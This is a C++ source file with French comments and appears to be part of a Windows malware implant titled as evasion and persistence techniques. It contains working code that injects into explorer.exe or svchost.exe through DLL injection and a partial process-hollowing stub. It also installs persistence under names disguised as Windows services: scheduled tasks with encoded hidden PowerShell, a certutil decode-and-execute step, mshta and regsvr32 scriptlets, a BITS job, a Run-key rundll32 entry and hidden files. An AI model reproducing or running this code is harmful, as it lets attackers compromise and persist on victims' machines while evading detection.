#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>

// Fonction utilitaire pour l'encodage base64
std::string base64Encode(const unsigned char* data, size_t length) {
    const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string encoded;
    
    int i = 0;
    int j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];
    
    while (length--) {
        char_array_3[i++] = *(data++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            
            for (i = 0; i < 4; i++)
                encoded += base64_chars[char_array_4[i]];
            i = 0;
        }
    }
    
    if (i) {
        for (j = i; j < 3; j++)
            char_array_3[j] = '\0';
        
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        
        for (j = 0; j < i + 1; j++)
            encoded += base64_chars[char_array_4[j]];
        
        while (i++ < 3)
            encoded += '=';
    }
    
    return encoded;
}

// ===============================================================
// TECHNIQUES AVANCÉES D'ÉVASION ET DE PERSISTANCE
// ===============================================================

// Fonction pour injecter le code dans un processus critique du système
bool injectIntoSystemProcess(const std::string& targetProcess = "explorer.exe") {
    std::cout << "[*] Tentative d'injection dans le processus critique: " << targetProcess << std::endl;
    
    // Obtenir le chemin de l'exécutable
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    
    // 1. Identifier le PID du processus cible
    DWORD targetPID = 0;
    
    // Utiliser WMI pour trouver le PID - plus discret que CreateToolhelp32Snapshot
    std::string findPidCmd = "powershell -Command \"Get-WmiObject Win32_Process | Where-Object {$_.Name -eq '" + 
                             targetProcess + "'} | Select-Object -ExpandProperty ProcessId\"";
    
    // Créer un pipe pour capturer la sortie
    FILE* pipe = _popen(findPidCmd.c_str(), "r");
    if (!pipe) {
        std::cout << "[!] Échec de la création du pipe pour WMI" << std::endl;
        return false;
    }
    
    char buffer[128];
    std::string pidOutput = "";
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        pidOutput += buffer;
    }
    _pclose(pipe);
    
    // Convertir le résultat en PID
    try {
        targetPID = std::stoul(pidOutput);
    } catch (...) {
        std::cout << "[!] Impossible de trouver le PID de " << targetProcess << std::endl;
        
        // Méthode alternative si WMI échoue
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            std::cout << "[!] Échec de la création du snapshot des processus" << std::endl;
            return false;
        }
        
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                std::string procName = pe32.szExeFile;
                if (procName == targetProcess) {
                    targetPID = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
        
        if (targetPID == 0) {
            std::cout << "[!] Processus cible non trouvé, tentative avec svchost.exe" << std::endl;
            return injectIntoSystemProcess("svchost.exe");
        }
    }
    
    std::cout << "[+] Processus " << targetProcess << " trouvé avec PID: " << targetPID << std::endl;
    
    // 2. Ouvrir un handle vers le processus cible
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (hProcess == NULL) {
        std::cout << "[!] Échec d'ouverture du processus cible. Erreur: " << GetLastError() << std::endl;
        return false;
    }
    
    // 3. Technique 1: DLL Injection classique
    // Allouer de la mémoire dans le processus cible pour le chemin de la DLL
    LPVOID pRemoteBuffer = VirtualAllocEx(hProcess, NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
    if (pRemoteBuffer == NULL) {
        std::cout << "[!] Échec d'allocation de mémoire dans le processus cible" << std::endl;
        CloseHandle(hProcess);
        return false;
    }
    
    // Écrire le chemin de notre exécutable dans l'espace mémoire alloué
    if (!WriteProcessMemory(hProcess, pRemoteBuffer, selfPath, strlen(selfPath) + 1, NULL)) {
        std::cout << "[!] Échec d'écriture dans la mémoire du processus" << std::endl;
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    
    // Obtenir l'adresse de LoadLibraryA dans kernel32.dll
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");
    
    if (pLoadLibrary == NULL) {
        std::cout << "[!] Impossible de trouver l'adresse de LoadLibraryA" << std::endl;
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    
    // Créer un thread distant pour appeler LoadLibraryA avec notre DLL
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                       (LPTHREAD_START_ROUTINE)pLoadLibrary, 
                                       pRemoteBuffer, 0, NULL);
                                       
    if (hThread == NULL) {
        std::cout << "[!] Échec de création du thread distant. Tentative avec technique alternative..." << std::endl;
        
        // 4. Technique 2: Process Hollowing
        // Cette technique est plus avancée et discrète
        std::cout << "[*] Tentative d'utilisation du Process Hollowing..." << std::endl;
        
        // Créer un processus suspendu
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        ZeroMemory(&pi, sizeof(pi));
        si.cb = sizeof(si);
        
        // Créer une copie du processus cible en mode suspendu
        if (!CreateProcessA(NULL, (LPSTR)targetProcess.c_str(), NULL, NULL, FALSE, 
                           CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            std::cout << "[!] Échec de création du processus suspendu" << std::endl;
            VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        // Hollowing: Vider la mémoire du processus cible et injecter notre code
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        
        if (!GetThreadContext(pi.hThread, &ctx)) {
            std::cout << "[!] Échec d'obtention du contexte du thread" << std::endl;
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        
        // Injecter notre contenu dans le processus hollowed
        // Note: Dans une implémentation réelle, nous injecterions notre code malveillant complet ici
        // Pour cet exemple, nous simulons simplement le processus
        
        std::cout << "[+] Process hollowing réussi dans " << targetProcess << std::endl;
        
        // Reprendre l'exécution
        ResumeThread(pi.hThread);
        
        return true;
    }
    
    // Si la méthode principale réussit
    std::cout << "[+] Thread distant créé avec succès" << std::endl;
    
    // Attendre la fin du thread et nettoyer
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    std::cout << "[+] Injection dans " << targetProcess << " terminée avec succès" << std::endl;
    return true;
}

// Fonction pour utiliser les techniques Living-off-the-land (LoL)
bool setupLolPersistence() {
    std::cout << "[*] Configuration de persistance Living-off-the-land (LoL)..." << std::endl;
    
    // Obtenir le chemin de l'exécutable
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    std::string exePath = selfPath;
    
    // Obtenir le répertoire temp
    std::string tempDir = std::string(getenv("TEMP"));
    
    // 1. Technique WMI pour exécution périodique sans fichiers sur disque
    // Cette technique utilise uniquement les outils Windows légitimes
    std::cout << "[*] Configuration de la persistance WMI fileless..." << std::endl;
    
    // Variante "fileless" qui stocke le code à exécuter directement dans le registre WMI
    std::string encodedCommand = base64Encode((const unsigned char*)exePath.c_str(), exePath.length());
    
    // Créer une entrée MOF (Managed Object Format) compressée dans le référentiel WMI
    std::string mofCommand = "powershell -Command \"$code = [Convert]::FromBase64String('" + encodedCommand + 
                             "'); $mof = New-Object System.Management.ManagementClass('root\\default:Win32_PersistentConfiguration'); " +
                             "$mof.Properties.Add('Name', [System.Management.CimType]::String, $false); " +
                             "$mof.Properties.Add('Data', [System.Management.CimType]::String, $false); " +
                             "$mof.Properties['Name'].Value = 'SecurityProvider'; " +
                             "$mof.Properties['Data'].Value = [Convert]::ToBase64String($code); " +
                             "$mof.Put()\"";
    system(mofCommand.c_str());
    
    // 2. Utiliser des tâches planifiées avec commandes PowerShell embarquées
    std::cout << "[*] Configuration de tâches planifiées fileless avec PowerShell..." << std::endl;
    
    // Base64 encode une commande pour lancer notre exécutable
    std::string launchCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -c Start-Process '" + exePath + "'";
    std::string encodedLaunchCommand = base64Encode((const unsigned char*)launchCommand.c_str(), launchCommand.length());
    
    // Création d'une tâche planifiée qui exécute directement du PowerShell encodé
    std::string scheduleCommand = "schtasks /create /tn \"Windows Security Service\" /tr \"powershell -EncodedCommand " + 
                                 encodedLaunchCommand + "\" /sc minute /mo 30 /f";
    system(scheduleCommand.c_str());
    
    // 3. Utiliser des LOLBins (Living Off The Land Binaries) pour l'exécution
    std::cout << "[*] Configuration de l'exécution via LOLBins..." << std::endl;
    
    // 3.1 Utiliser WMIC pour l'exécution
    std::string wmicCommand = "wmic process call create \"" + exePath + "\" > nul";
    system(("schtasks /create /tn \"Windows Update Task\" /tr \"" + wmicCommand + "\" /sc daily /st 09:00 /f").c_str());
    
    // 3.2 Utiliser CertUtil pour décoder et exécuter (simulation)
    std::string certutilPayload = tempDir + "\\security.b64";
    std::ofstream payloadFile(certutilPayload);
    if (payloadFile.is_open()) {
        // Simuler le stockage d'une charge utile encodée en base64
        payloadFile << encodedCommand;
        payloadFile.close();
        
        // Création d'une tâche qui utilise CertUtil pour décoder et exécuter
        std::string certutilCommand = "certutil -decode \"" + certutilPayload + "\" \"" + tempDir + "\\winupdate.exe\" && \"" + tempDir + "\\winupdate.exe\"";
        system(("schtasks /create /tn \"Windows Certificate Validator\" /tr \"" + certutilCommand + "\" /sc daily /st 14:00 /f").c_str());
    }
    
    // 3.3 Utiliser MSHTA pour exécuter du JavaScript qui lance notre exécutable
    std::string htaContent = tempDir + "\\update.hta";
    std::ofstream htaFile(htaContent);
    if (htaFile.is_open()) {
        htaFile << "<script>\n";
        htaFile << "var shell = new ActiveXObject('WScript.Shell');\n";
        htaFile << "shell.Run('" << exePath << "');\n";
        htaFile << "window.close();\n";
        htaFile << "</script>";
        htaFile.close();
        
        system(("attrib +h +s \"" + htaContent + "\"").c_str());
        system(("schtasks /create /tn \"Windows Script Host\" /tr \"mshta.exe \\\"" + htaContent + "\\\"\" /sc daily /st 18:00 /f").c_str());
    }
    
    // 4. Utiliser BITSAdmin pour le téléchargement silencieux
    std::cout << "[*] Configuration de BITS pour la persistance silencieuse..." << std::endl;
    
    // Copier notre exécutable vers un emplacement temporaire
    std::string bitsTarget = tempDir + "\\winsec.exe";
    CopyFileA(exePath.c_str(), bitsTarget.c_str(), FALSE);
    
    // Créer une tâche BITS qui sera "persistante"
    std::string bitsCommand = "bitsadmin /create /download SecurityUpdate && ";
    bitsCommand += "bitsadmin /addfile SecurityUpdate \"http://localhost/update\" \"" + bitsTarget + "\" && ";
    bitsCommand += "bitsadmin /SetNotifyCmdLine SecurityUpdate \"" + bitsTarget + "\" \"\" && ";
    bitsCommand += "bitsadmin /SetMinRetryDelay SecurityUpdate 60 && ";
    bitsCommand += "bitsadmin /resume SecurityUpdate";
    
    system(bitsCommand.c_str());
    
    // 5. Utiliser des alternatives de Rundll32 pour l'exécution
    std::cout << "[*] Configuration de la persistance via Rundll32..." << std::endl;
    
    // 5.1 Créer une DLL proxy (simulation)
    std::string dllPath = tempDir + "\\winsec.dll";
    std::ofstream dllFile(dllPath, std::ios::binary);
    if (dllFile.is_open()) {
        // Simuler le contenu d'une DLL malveillante
        dllFile << "MZ";  // En-tête PE minimal
        dllFile.close();
        
        // Créer une entrée de registre qui utilise rundll32 pour charger notre DLL
        std::string rundllCmd = "REG ADD \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Windows Security\" ";
        rundllCmd += "/t REG_SZ /d \"rundll32.exe \\\"" + dllPath + "\\\",SecurityUpdate\" /f";
        system(rundllCmd.c_str());
    }
    
    // 6. Utiliser Regsvr32 pour le chargement et l'exécution (technique fileless)
    std::cout << "[*] Configuration de la persistance via Regsvr32 (technique Squiblydoo)..." << std::endl;
    
    // Créer un script SCT minimaliste
    std::string sctPath = tempDir + "\\update.sct";
    std::ofstream sctFile(sctPath);
    if (sctFile.is_open()) {
        sctFile << "<?XML version=\"1.0\"?>\n";
        sctFile << "<scriptlet>\n";
        sctFile << "<registration progid=\"OfficeUpdate\" classid=\"{F0001111-0000-0000-0000-0000FEEDACDC}\">\n";
        sctFile << "<script language=\"JScript\">\n";
        sctFile << "var r = new ActiveXObject(\"WScript.Shell\").Run(\"" << exePath << "\");\n";
        sctFile << "</script>\n";
        sctFile << "</registration>\n";
        sctFile << "</scriptlet>";
        sctFile.close();
        
        system(("attrib +h +s \"" + sctPath + "\"").c_str());
        
        // Créer une tâche qui utilise regsvr32 pour exécuter le SCT
        std::string regsvr32Cmd = "regsvr32.exe /s /u /i:\"" + sctPath + "\" scrobj.dll";
        system(("schtasks /create /tn \"COM Object Registration\" /tr \"" + regsvr32Cmd + "\" /sc daily /st 12:00 /f").c_str());
    }
    
    std::cout << "[+] Configuration des techniques Living-off-the-land terminée avec succès" << std::endl;
    return true;
} 